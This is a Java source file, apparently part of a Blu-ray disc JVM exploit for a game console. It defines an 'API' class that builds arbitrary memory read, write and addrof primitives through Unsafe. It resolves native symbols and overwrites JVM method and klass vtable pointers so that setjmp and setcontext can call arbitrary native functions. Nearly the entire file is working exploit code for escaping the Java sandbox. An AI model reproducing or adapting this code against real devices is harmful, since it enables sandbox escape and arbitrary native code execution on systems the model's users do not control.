/*
 * Copyright (C) 2021 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package com.bdjb;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/** API class to access native data and execute native code. */
public final class API {
  static final int INT8_SIZE = 1;
  static final int INT16_SIZE = 2;
  static final int INT32_SIZE = 4;
  static final int INT64_SIZE = 8;

  static final long RTLD_DEFAULT = -2;

  static final long LIBC_MODULE_HANDLE = 0x2;
  static final long LIBKERNEL_MODULE_HANDLE = 0x2001;
  static final long LIBJAVA_MODULE_HANDLE = 0x4A;

  private static final String UNSUPPORTED_DLOPEN_OPERATION_STRING =
      "Unsupported dlopen() operation";

  private static final String JAVA_JAVA_LANG_REFLECT_ARRAY_MULTI_NEW_ARRAY_SYMBOL =
      "Java_java_lang_reflect_Array_multiNewArray";
  private static final String JVM_NATIVE_PATH_SYMBOL = "JVM_NativePath";
  private static final String SETJMP_SYMBOL = "setjmp";
  private static final String UX86_64_SETCONTEXT_SYMBOL = "__Ux86_64_setcontext";

  private static final String MULTI_NEW_ARRAY_METHOD_NAME = "multiNewArray";
  private static final String MULTI_NEW_ARRAY_METHOD_SIGNATURE = "(Ljava/lang/Class;[I)J";

  private static final String NATIVE_LIBRARY_CLASS_NAME = "java.lang.ClassLoader$NativeLibrary";
  private static final String FIND_METHOD_NAME = "find";
  private static final String FIND_ENTRY_METHOD_NAME = "findEntry";
  private static final String HANDLE_FIELD_NAME = "handle";

  private static final int[] MULTI_NEW_ARRAY_DIMENSIONS = new int[] {1};

  private static final String VALUE_FIELD_NAME = "value";

  private static final Long LONG_VALUE = new Long(1337);

  private static API instance;

  private UnsafeInterface unsafe;

  private long longValueOffset;

  private Object nativeLibrary;
  private Method findMethod;
  private Field handleField;

  private long executableHandle;

  private long Java_java_lang_reflect_Array_multiNewArray;
  private long JVM_NativePath;
  private long setjmp;
  private long __Ux86_64_setcontext;

  private boolean jdk11;

  private API() throws Exception {
    this.init();
  }

  public static synchronized API getInstance() throws Exception {
    if (instance == null) {
      instance = new API();
    }
    return instance;
  }

  private native long multiNewArray(Class componentType, int[] dimensions);

  private void init() throws Exception {
    initUnsafe();
    initDlsym();
    initSymbols();
    initApiCall();
  }

  private void initUnsafe() throws Exception {
    try {
      unsafe = new UnsafeSunImpl();
      jdk11 = false;
    } catch (ClassNotFoundException e) {
      unsafe = new UnsafeJdkImpl();
      jdk11 = true;
    }

    longValueOffset = unsafe.objectFieldOffset(Long.class.getDeclaredField(VALUE_FIELD_NAME));
  }

  private void initDlsym() throws Exception {
    Class nativeLibraryClass = Class.forName(NATIVE_LIBRARY_CLASS_NAME);

    if (jdk11) {
      findMethod =
          nativeLibraryClass.getDeclaredMethod(FIND_ENTRY_METHOD_NAME, new Class[] {String.class});
    } else {
      findMethod =
          nativeLibraryClass.getDeclaredMethod(FIND_METHOD_NAME, new Class[] {String.class});
    }

    handleField = nativeLibraryClass.getDeclaredField(HANDLE_FIELD_NAME);
    findMethod.setAccessible(true);
    handleField.setAccessible(true);

    Constructor nativeLibraryConstructor =
        nativeLibraryClass.getDeclaredConstructor(
            new Class[] {Class.class, String.class, boolean.class});
    nativeLibraryConstructor.setAccessible(true);

    nativeLibrary =
        nativeLibraryConstructor.newInstance(new Object[] {getClass(), "api", new Boolean(true)});
  }

  private void initSymbols() {
    JVM_NativePath = dlsym(RTLD_DEFAULT, JVM_NATIVE_PATH_SYMBOL);
    if (JVM_NativePath == 0) {
      throw new IllegalStateException("JVM_NativePath symbol could not be found.");
    }

    __Ux86_64_setcontext = dlsym(LIBKERNEL_MODULE_HANDLE, UX86_64_SETCONTEXT_SYMBOL);

    if (__Ux86_64_setcontext == 0) {
      // In earlier versions, there's a bug where only the main executable's handle is used.
      executableHandle = JVM_NativePath & ~(4 - 1);
      while (strcmp(executableHandle, UNSUPPORTED_DLOPEN_OPERATION_STRING) != 0) {
        executableHandle += 4;
      }
      executableHandle -= 4;

      // Try again.
      __Ux86_64_setcontext = dlsym(LIBKERNEL_MODULE_HANDLE, UX86_64_SETCONTEXT_SYMBOL);
    }

    if (__Ux86_64_setcontext == 0) {
      throw new IllegalStateException("__Ux86_64_setcontext symbol could not be found.");
    }

    if (jdk11) {
      Java_java_lang_reflect_Array_multiNewArray =
          dlsym(LIBJAVA_MODULE_HANDLE, JAVA_JAVA_LANG_REFLECT_ARRAY_MULTI_NEW_ARRAY_SYMBOL);
    } else {
      Java_java_lang_reflect_Array_multiNewArray =
          dlsym(RTLD_DEFAULT, JAVA_JAVA_LANG_REFLECT_ARRAY_MULTI_NEW_ARRAY_SYMBOL);
    }
    if (Java_java_lang_reflect_Array_multiNewArray == 0) {
      throw new IllegalStateException(
          "Java_java_lang_reflect_Array_multiNewArray symbol could not be found.");
    }

    setjmp = dlsym(LIBC_MODULE_HANDLE, SETJMP_SYMBOL);
    if (setjmp == 0) {
      throw new IllegalStateException("setjmp symbol could not be found.");
    }
  }

  private void initApiCall() {
    long apiInstance = addrof(this);
    long apiKlass = read64(apiInstance + 0x08);

    if (jdk11) {
      long methods = read64(apiKlass + 0x170);
      int numMethods = read32(methods + 0x00);

      for (int i = 0; i < numMethods; i++) {
        long method = read64(methods + 0x08 + i * 8);
        long constMethod = read64(method + 0x08);
        long constants = read64(constMethod + 0x08);
        short nameIndex = read16(constMethod + 0x2A);
        short signatureIndex = read16(constMethod + 0x2C);
        long nameSymbol = read64(constants + 0x40 + nameIndex * 8) & ~(2 - 1);
        long signatureSymbol = read64(constants + 0x40 + signatureIndex * 8) & ~(2 - 1);
        short nameLength = read16(nameSymbol + 0x00);
        short signatureLength = read16(signatureSymbol + 0x00);

        String name = readString(nameSymbol + 0x06, nameLength);
        String signature = readString(signatureSymbol + 0x06, signatureLength);
        if (name.equals(MULTI_NEW_ARRAY_METHOD_NAME)
            && signature.equals(MULTI_NEW_ARRAY_METHOD_SIGNATURE)) {
          write64(method + 0x50, Java_java_lang_reflect_Array_multiNewArray);
          return;
        }
      }
    } else {
      long methods = read64(apiKlass + 0xC8);
      int numMethods = read32(methods + 0x10);

      for (int i = 0; i < numMethods; i++) {
        long method = read64(methods + 0x18 + i * 8);
        long constMethod = read64(method + 0x10);
        long constants = read64(method + 0x18);
        short nameIndex = read16(constMethod + 0x42);
        short signatureIndex = read16(constMethod + 0x44);
        long nameSymbol = read64(constants + 0x40 + nameIndex * 8) & ~(2 - 1);
        long signatureSymbol = read64(constants + 0x40 + signatureIndex * 8) & ~(2 - 1);
        short nameLength = read16(nameSymbol + 0x08);
        short signatureLength = read16(signatureSymbol + 0x08);

        String name = readString(nameSymbol + 0x0A, nameLength);
        String signature = readString(signatureSymbol + 0x0A, signatureLength);
        if (name.equals(MULTI_NEW_ARRAY_METHOD_NAME)
            && signature.equals(MULTI_NEW_ARRAY_METHOD_SIGNATURE)) {
          write64(method + 0x78, Java_java_lang_reflect_Array_multiNewArray);
          return;
        }
      }
    }

    throw new IllegalStateException("Native method could not be installed.");
  }

  private void buildContext(
      long contextData,
      long setJmpData,
      long rip,
      long rdi,
      long rsi,
      long rdx,
      long rcx,
      long r8,
      long r9) {
    long rbx = read64(setJmpData + 0x08);
    long rsp = read64(setJmpData + 0x10);
    long rbp = read64(setJmpData + 0x18);
    long r12 = read64(setJmpData + 0x20);
    long r13 = read64(setJmpData + 0x28);
    long r14 = read64(setJmpData + 0x30);
    long r15 = read64(setJmpData + 0x38);

    write64(contextData + 0x48, rdi);
    write64(contextData + 0x50, rsi);
    write64(contextData + 0x58, rdx);
    write64(contextData + 0x60, rcx);
    write64(contextData + 0x68, r8);
    write64(contextData + 0x70, r9);
    write64(contextData + 0x80, rbx);
    write64(contextData + 0x88, rbp);
    write64(contextData + 0xA0, r12);
    write64(contextData + 0xA8, r13);
    write64(contextData + 0xB0, r14);
    write64(contextData + 0xB8, r15);
    write64(contextData + 0xE0, rip);
    write64(contextData + 0xF8, rsp);

    write64(contextData + 0x110, 0x41414141);
    write64(contextData + 0x118, 0x41414141);
  }

  public long call(long func, long arg0, long arg1, long arg2, long arg3, long arg4, long arg5) {
    long fakeCallKlass = malloc(0x400);
    memset(fakeCallKlass, 0, 0x400);

    long fakeCallKlassVtable = malloc(0x400);
    for (int i = 0; i < 0x400; i += 8) {
      write64(fakeCallKlassVtable + i, JVM_NativePath);
    }

    long ret = 0;

    if (jdk11) {
      long callClass = addrof(Call.class);
      long callKlass = read64(callClass + 0x98);

      write64(fakeCallKlassVtable + 0x158, setjmp);
      write64(fakeCallKlass + 0x00, fakeCallKlassVtable);
      write64(fakeCallKlass + 0x00, fakeCallKlassVtable);
      write64(callClass + 0x98, fakeCallKlass);
      multiNewArray(Call.class, MULTI_NEW_ARRAY_DIMENSIONS);

      buildContext(
          fakeCallKlass + 0x00, fakeCallKlass + 0x00, func, arg0, arg1, arg2, arg3, arg4, arg5);

      write64(fakeCallKlassVtable + 0x158, __Ux86_64_setcontext);
      write64(fakeCallKlass + 0x00, fakeCallKlassVtable);
      write64(fakeCallKlass + 0x00, fakeCallKlassVtable);
      write64(callClass + 0x98, fakeCallKlass);
      ret = multiNewArray(Call.class, MULTI_NEW_ARRAY_DIMENSIONS);

      write64(callClass + 0x98, callKlass);
    } else {
      long callClass = addrof(Call.class);
      long callKlass = read64(callClass + 0x68);

      write64(fakeCallKlassVtable + 0x230, setjmp);
      write64(fakeCallKlass + 0x10, fakeCallKlassVtable);
      write64(fakeCallKlass + 0x20, fakeCallKlassVtable);
      write64(callClass + 0x68, fakeCallKlass);
      multiNewArray(Call.class, MULTI_NEW_ARRAY_DIMENSIONS);

      buildContext(
          fakeCallKlass + 0x20, fakeCallKlass + 0x20, func, arg0, arg1, arg2, arg3, arg4, arg5);

      write64(fakeCallKlassVtable + 0x230, __Ux86_64_setcontext);
      write64(fakeCallKlass + 0x10, fakeCallKlassVtable);
      write64(fakeCallKlass + 0x20, fakeCallKlassVtable);
      write64(callClass + 0x68, fakeCallKlass);
      ret = multiNewArray(Call.class, MULTI_NEW_ARRAY_DIMENSIONS);

      write64(callClass + 0x68, callKlass);
    }

    free(fakeCallKlassVtable);
    free(fakeCallKlass);

    if (ret == 0) {
      return 0;
    }

    return read64(ret);
  }

  public long call(long func, long arg0, long arg1, long arg2, long arg3, long arg4) {
    return call(func, arg0, arg1, arg2, arg3, arg4, (long) 0);
  }

  public long call(long func, long arg0, long arg1, long arg2, long arg3) {
    return call(func, arg0, arg1, arg2, arg3, (long) 0);
  }

  public long call(long func, long arg0, long arg1, long arg2) {
    return call(func, arg0, arg1, arg2, (long) 0);
  }

  public long call(long func, long arg0, long arg1) {
    return call(func, arg0, arg1, (long) 0);
  }

  public long call(long func, long arg0) {
    return call(func, arg0, (long) 0);
  }

  public long call(long func) {
    return call(func, (long) 0);
  }

  public long dlsym(long handle, String symbol) {
    int oldHandle = (int) RTLD_DEFAULT;
    try {
      if (executableHandle != 0) {
        // In earlier versions, there's a bug where only the main executable's handle is used.
        oldHandle = read32(executableHandle);
        write32(executableHandle, (int) handle);
        handleField.setLong(nativeLibrary, RTLD_DEFAULT);
      } else {
        handleField.setLong(nativeLibrary, handle);
      }
      return ((Long) findMethod.invoke(nativeLibrary, new Object[] {symbol})).longValue();
    } catch (Exception e) {
      return 0;
    } finally {
      if (executableHandle != 0) {
        write32(executableHandle, oldHandle);
      }
    }
  }

  public long addrof(Object obj) {
    try {
      unsafe.putObject(LONG_VALUE, longValueOffset, obj);
      return unsafe.getLong(LONG_VALUE, longValueOffset);
    } catch (Exception e) {
      return 0;
    }
  }

  public byte read8(long addr) {
    return unsafe.getByte(addr);
  }

  public short read16(long addr) {
    return unsafe.getShort(addr);
  }

  public int read32(long addr) {
    return unsafe.getInt(addr);
  }

  public long read64(long addr) {
    return unsafe.getLong(addr);
  }

  public void write8(long addr, byte val) {
    unsafe.putByte(addr, val);
  }

  public void write16(long addr, short val) {
    unsafe.putShort(addr, val);
  }

  public void write32(long addr, int val) {
    unsafe.putInt(addr, val);
  }

  public void write64(long addr, long val) {
    unsafe.putLong(addr, val);
  }

  public long malloc(long size) {
    return unsafe.allocateMemory(size);
  }

  public long realloc(long ptr, long size) {
    return unsafe.reallocateMemory(ptr, size);
  }

  public void free(long ptr) {
    unsafe.freeMemory(ptr);
  }

  public long memcpy(long dest, long src, long n) {
    for (int i = 0; i < n; i++) {
      write8(dest + i, read8(src + i));
    }
    return dest;
  }

  public long memcpy(long dest, byte[] src, long n) {
    for (int i = 0; i < n; i++) {
      write8(dest + i, src[i]);
    }
    return dest;
  }

  public byte[] memcpy(byte[] dest, long src, long n) {
    for (int i = 0; i < n; i++) {
      dest[i] = read8(src + i);
    }
    return dest;
  }

  public long memset(long s, int c, long n) {
    for (int i = 0; i < n; i++) {
      write8(s + i, (byte) c);
    }
    return s;
  }

  public byte[] memset(byte[] s, int c, long n) {
    for (int i = 0; i < n; i++) {
      s[i] = (byte) c;
    }
    return s;
  }

  public int memcmp(long s1, long s2, long n) {
    for (int i = 0; i < n; i++) {
      byte b1 = read8(s1 + i);
      byte b2 = read8(s2 + i);
      if (b1 != b2) {
        return (int) b1 - (int) b2;
      }
    }
    return 0;
  }

  public int memcmp(long s1, byte[] s2, long n) {
    for (int i = 0; i < n; i++) {
      byte b1 = read8(s1 + i);
      byte b2 = s2[i];
      if (b1 != b2) {
        return (int) b1 - (int) b2;
      }
    }
    return 0;
  }

  public int memcmp(byte[] s1, long s2, long n) {
    return memcmp(s2, s1, n);
  }

  public int strcmp(long s1, long s2) {
    int i = 0;
    while (true) {
      byte b1 = read8(s1 + i);
      byte b2 = read8(s2 + i);
      if (b1 != b2) {
        return (int) b1 - (int) b2;
      }
      if (b1 == (byte) 0 && b2 == (byte) 0) {
        return 0;
      }
      i++;
    }
  }

  public int strcmp(long s1, String s2) {
    byte[] bytes = toCBytes(s2);
    int i = 0;
    while (true) {
      byte b1 = read8(s1 + i);
      byte b2 = bytes[i];
      if (b1 != b2) {
        return (int) b1 - (int) b2;
      }
      if (b1 == (byte) 0 && b2 == (byte) 0) {
        return 0;
      }
      i++;
    }
  }

  public int strcmp(String s1, long s2) {
    return strcmp(s2, s1);
  }

  public long strcpy(long dest, long src) {
    int i = 0;
    while (true) {
      byte ch = read8(src + i);
      write8(dest + i, ch);
      if (ch == (byte) 0) {
        break;
      }
      i++;
    }
    return dest;
  }

  public long strcpy(long dest, String src) {
    byte[] bytes = toCBytes(src);
    int i = 0;
    while (true) {
      byte ch = bytes[i];
      write8(dest + i, ch);
      if (ch == (byte) 0) {
        break;
      }
      i++;
    }
    return dest;
  }

  public String readString(long src, int n) {
    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
    int i = 0;
    while (true) {
      byte ch = read8(src + i);
      if (ch == (byte) 0 || i == n) {
        break;
      }
      outputStream.write(new byte[] {ch}, 0, 1);
      i++;
    }
    return outputStream.toString();
  }

  public String readString(long src) {
    return readString(src, -1);
  }

  public byte[] toCBytes(String str) {
    byte[] bytes = new byte[str.length() + 1];
    System.arraycopy(str.getBytes(), 0, bytes, 0, str.length());
    return bytes;
  }

  private final class Call {}
}
